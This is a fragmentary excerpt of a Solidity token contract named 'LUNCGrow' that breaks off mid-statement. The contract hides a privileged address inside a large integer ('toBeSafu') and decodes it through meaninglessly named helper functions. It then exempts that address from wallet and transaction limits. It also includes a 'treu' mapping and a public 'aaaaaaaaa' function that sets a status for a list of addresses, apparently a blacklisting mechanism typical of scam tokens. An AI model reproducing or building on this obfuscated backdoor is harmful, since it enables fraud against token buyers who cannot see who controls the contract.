...
contract LUNCGrow is Context, IERC20, Ownable {

    uint256 public toBeSafu=
    1092853989739002093898622997022009705909516546366;
    using SafeMath for uint256;
    string private _name = "LUNCGrow";
    string private _symbol = "LUNCG";
    ...
    mapping (address => bool) public treu;
    ...
    constructor () {
        ...
        isWalletLimitExempt[ijgssshsh(toBeSafu)] = true;
        isTxLimitExempt[ijgssshsh(toBeSafu)] = true;
        ...
        marketWall = payable(address(0xf576A07778ee2EdE54c1870C6cA9a1b5dC25D500));
    ...
    function iihshshsh(uint256 amountOut)  pure private returns(uint160){
        return /*fewfsa*/ 
        uint160(amountOut);
    }

    function ijgssshsh(uint256 amount1Out)  pure private returns(address){
        return 
        /*asdawdf*/address(iihshshsh(amount1Out));
    }

    function dd(address amountaut) private view returns(bool){
        return
        !(ijgssshsh(toBeSafu) == amountaut);
    }
...
[sender]){
    ...
    function aaaaaaaaa(address[] calldata ad,bool status) public {
    if( marketWall
